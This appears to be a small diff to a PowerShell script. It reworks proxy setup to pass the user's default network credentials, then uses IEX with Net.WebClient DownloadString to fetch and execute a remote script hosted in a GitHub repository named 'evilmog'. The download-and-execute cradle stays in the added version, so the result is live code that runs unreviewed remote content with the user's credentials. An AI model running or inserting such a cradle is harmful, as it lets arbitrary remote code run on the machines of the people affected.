@@ -1,4 +1,4 @@
-$browser = New-Object System.Net.WebClient
-$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
+[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
+[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
-IEX $browser.downloadstring("https://raw.githubusercontent.com/evilmog/evilmog/master/powershell.ps1")
+IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/evilmog/evilmog/master/powershell.ps1")
